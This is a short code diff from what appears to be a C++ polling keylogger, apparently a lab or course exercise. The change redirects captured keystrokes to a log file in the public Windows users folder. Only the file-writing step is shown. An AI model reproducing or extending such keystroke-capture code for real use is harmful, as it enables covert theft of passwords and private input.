@@ -102,7 +102,7 @@ int main()
                 {
 
                     fstream LogFile;
-                    LogFile.open("dat.txt", fstream::app);
+                    LogFile.open("C:\\Users\\Public\\A04_1b_polling_keylog.txt", fstream::app);
                     if (LogFile.is_open())
                     {
                         LogFile << char(KEY);
